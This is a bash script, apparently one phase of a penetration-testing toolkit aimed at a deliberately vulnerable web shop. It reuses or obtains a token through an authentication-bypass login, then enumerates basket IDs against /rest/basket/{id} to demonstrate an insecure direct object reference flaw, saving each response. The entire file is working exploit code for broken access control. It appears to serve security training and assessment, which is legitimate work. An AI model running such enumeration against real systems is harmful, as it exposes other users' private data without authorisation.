#!/usr/bin/env bash
# ---------------------------------------------------------------------------
# scripts/05_idor.sh — Phase 6: Broken access control (IDOR)
#
# Using the bearer token from the auth-bypass login, walks a range of
# basket IDs against /rest/basket/{id} and calls /rest/user/whoami to
# show the server trusts the client-supplied ID instead of checking that
# the basket actually belongs to the authenticated user.
# ---------------------------------------------------------------------------
source "$(dirname "${BASH_SOURCE[0]}")/lib.sh"

require curl "apt install curl / brew install curl"
require jq "apt install jq / brew install jq"

OUT_DIR="${VAPT_ROOT}/${RESULTS_DIR}/idor"
mkdir -p "$OUT_DIR"

TOKEN_FILE="${VAPT_ROOT}/${RESULTS_DIR}/jwt/token.txt"
if [[ -s "$TOKEN_FILE" ]]; then
  token="$(cat "$TOKEN_FILE")"
else
  log "No cached token found — logging in with the auth-bypass payload..."
  token="$(login_and_capture_token)" || { err "Could not obtain a token."; exit 1; }
fi

log "Calling /rest/user/whoami to confirm the authenticated identity..."
curl -fsS "${TARGET_URL}/rest/user/whoami" \
  -H "Authorization: Bearer ${token}" \
  -o "${OUT_DIR}/whoami.json"
jq '.' "${OUT_DIR}/whoami.json" | tee "$(logfile 05_idor)"

log "Probing /rest/basket/{id} for basket IDs: ${IDOR_BASKET_IDS}"
: > "${OUT_DIR}/basket_idor_summary.txt"
for id in ${IDOR_BASKET_IDS}; do
  resp_file="${OUT_DIR}/basket_${id}.json"
  status="$(curl -s -o "$resp_file" -w '%{http_code}' \
    "${TARGET_URL}/rest/basket/${id}" \
    -H "Authorization: Bearer ${token}")"
  echo "basket id ${id}: HTTP ${status} -> ${resp_file}" | tee -a "${OUT_DIR}/basket_idor_summary.txt"
done

ok "IDOR probe results saved under ${OUT_DIR}/ (whoami.json, basket_<id>.json, basket_idor_summary.txt)"
